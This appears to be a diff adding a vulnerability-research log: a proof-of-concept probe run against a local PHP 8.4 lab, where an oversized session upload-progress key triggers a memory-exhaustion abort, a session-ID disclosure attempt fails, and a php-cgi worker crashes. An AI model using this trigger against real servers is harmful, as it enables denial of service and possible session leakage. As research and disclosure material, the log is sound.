@@ -1,0 +1,38 @@
+# Captured on PHP 8.4.24 + Apache mod_php, single worker, memory_limit=16M.
+# 1) verified trigger
+$ python3 poc/php2shell_probe.py --target http://127.0.0.1:18090 --mode oom
+[*] php2shell probe -> http://127.0.0.1:18090/index.php
+[*] mode=oom
+[*] POST 4194558 bytes, progress key 4194304 bytes
+[*] HTTP 200 in 0.00s, body=0B, Set-Cookie=None
+[+] request aborted before any application code ran (empty response, no session cookie) -> pre-RINIT callback path
+[*] worker still serving: True
+
+$ tail -1 /tmp/php2shell-lab/error.log
+[Wed Oct 21 20:47:31 2026] [php:error] [pid 3009707:tid 3009707] [client 127.0.0.1:34728]
+PHP Fatal error:  Allowed memory size of 16777216 bytes exhausted (tried to allocate
+4194336 bytes) in Unknown on line 0
+
+# 2) control: key below the limit, script runs normally
+$ python3 poc/php2shell_probe.py --target http://127.0.0.1:18090 --mode oom --key-bytes 1048576
+[*] POST 1048830 bytes, progress key 1048576 bytes
+[*] HTTP 200 in 0.00s, body=56B, Set-Cookie=f75695dfa56f966c3feb14d0b29ddbd0
+[*] no abort: the target absorbed the body (memory_limit / post_max_size above key-bytes)
+
+# 3) disclosure probe: A aborts, B is served by the same worker, cookie well-formed
+$ python3 poc/php2shell_probe.py --target http://127.0.0.1:18090 --mode stale-sid
+[*] A: HTTP 200, body=0B, cookie=None, aborted=True
+[*] B: HTTP 200, cookie='2394f4c393acdc2e909858f92f7a8974' (len=32)
+[-] no disclosure observed at this memory limit / heap layout
+[i] The SID allocation must be the allocation that fails; needs chunk
+[i] grooming (see --mode sweep in a lab with a settable memory_limit).
+
+# 4) php-cgi FastCGI worker, same request (16M): the process exits instead
+--- mem=16M pid=2942979
+  req0 GET rc= 0
+  req1 POST rc= 0 oom= True ... tried to allocate 4194336 bytes ... in Unknown on line 0
+  poll after req1: 255
+  tcp connect failed: [Errno 111] Connection refused
+
+# 5) allocation sizes that actually failed across sweeps (never the ~32-byte SID)
+  4194336  4194352  872448  921600  970752  1794048  1843200  1892352  1941504
